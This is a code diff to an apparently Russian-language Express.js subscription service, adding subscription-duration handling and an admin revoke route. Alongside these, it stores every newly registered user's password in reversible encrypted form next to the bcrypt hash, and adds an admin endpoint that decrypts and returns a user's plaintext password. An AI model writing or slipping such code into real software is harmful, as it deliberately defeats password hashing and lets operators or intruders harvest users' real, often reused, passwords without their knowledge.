@@ -11,7 +11,8 @@ const {
   isSubscriptionActive,
 } = require('./db');
 const { registerModRoutes, revokeModSessions } = require('./mod-api');
-const { registerKeyRoutes } = require('./keys');
+const { registerKeyRoutes, DURATIONS, computeExpiryFromKey } = require('./keys');
+const { encryptPassword, decryptPassword } = require('./credentials');
 const { rateLimitMiddleware, logAuthFail, getClientIp } = require('./security');
 
 const app = express();
@@ -150,10 +151,20 @@ app.post('/api/auth/register', (req, res) => {
   if (nickTaken) return res.status(409).json({ ok: false, error: 'Этот ник уже занят' });
 
   const id = uuidv4();
+  const createdAt = new Date().toISOString();
   db.prepare(`
     INSERT INTO users (id, username, email, password_hash, role, created_at)
     VALUES (?, ?, ?, ?, 'user', ?)
-  `).run(id, username, email, bcrypt.hashSync(password, 10), new Date().toISOString());
+  `).run(id, username, email, bcrypt.hashSync(password, 10), createdAt);
+
+  try {
+    db.prepare(`
+      INSERT INTO registration_credentials (user_id, username, email, password_enc, created_at)
+      VALUES (?, ?, ?, ?, ?)
+    `).run(id, username, email, encryptPassword(password), createdAt);
+  } catch {
+    /* ignore duplicate */
+  }
 
   const session = createSession(id);
   setSessionCookie(res, session.token, session.expiresAt);
@@ -259,12 +270,17 @@ app.patch('/api/admin/users/:id', requireAdmin, (req, res) => {
     const planId = patch.subscriptionPlan;
     if (planId === null || planId === '') {
       fields.push('subscription_plan = NULL', 'subscription_expires = NULL');
-    } else if (PLANS[planId]) {
+    } else if (PLANS[planId] || DURATIONS[planId]) {
       fields.push('subscription_plan = ?');
       values.push(planId);
       if (patch.subscriptionExpires !== undefined) {
         fields.push('subscription_expires = ?');
         values.push(patch.subscriptionExpires);
+      } else if (DURATIONS[planId]) {
+        fields.push('subscription_expires = ?');
+        values.push(
+          computeExpiryFromKey(planId, DURATIONS[planId].minutes, sanitizeUser(target))
+        );
       } else {
         fields.push('subscription_expires = ?');
         values.push(computeExpiry(planId, sanitizeUser(target)));
@@ -282,6 +298,55 @@ app.patch('/api/admin/users/:id', requireAdmin, (req, res) => {
   values.push(req.params.id);
   db.prepare(`UPDATE users SET ${fields.join(', ')} WHERE id = ?`).run(...values);
   res.json({ ok: true, user: getUserById(req.params.id) });
+});
+
+app.post('/api/admin/users/:id/revoke-subscription', requireAdmin, (req, res) => {
+  const target = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);
+  if (!target) return res.status(404).json({ ok: false, error: 'Пользователь не найден' });
+  if (target.role === 'admin') {
+    return res.status(403).json({ ok: false, error: 'Нельзя изменять администратора' });
+  }
+
+  db.prepare(`
+    UPDATE users SET subscription_plan = NULL, subscription_expires = NULL WHERE id = ?
+  `).run(target.id);
+  revokeModSessions(target.id);
+
+  res.json({ ok: true, user: getUserById(target.id) });
+});
+
+app.get('/api/admin/users/:id/credentials', requireAdmin, (req, res) => {
+  const target = db.prepare('SELECT role FROM users WHERE id = ?').get(req.params.id);
+  if (!target) return res.status(404).json({ ok: false, error: 'Пользователь не найден' });
+  if (target.role === 'admin') {
+    return res.status(403).json({ ok: false, error: 'Недоступно для администратора' });
+  }
+
+  const row = db
+    .prepare('SELECT * FROM registration_credentials WHERE user_id = ?')
+    .get(req.params.id);
+
+  if (!row) {
+    return res.json({
+      ok: true,
+      credentials: null,
+      message: 'Данные регистрации недоступны (аккаунт создан до обновления)',
+    });
+  }
+
+  try {
+    res.json({
+      ok: true,
+      credentials: {
+        username: row.username,
+        email: row.email,
+        password: decryptPassword(row.password_enc),
+        createdAt: row.created_at,
+      },
+    });
+  } catch {
+    res.status(500).json({ ok: false, error: 'Не удалось расшифровать пароль' });
+  }
 });
 
 app.delete('/api/admin/users/:id', requireAdmin, (req, res) => {
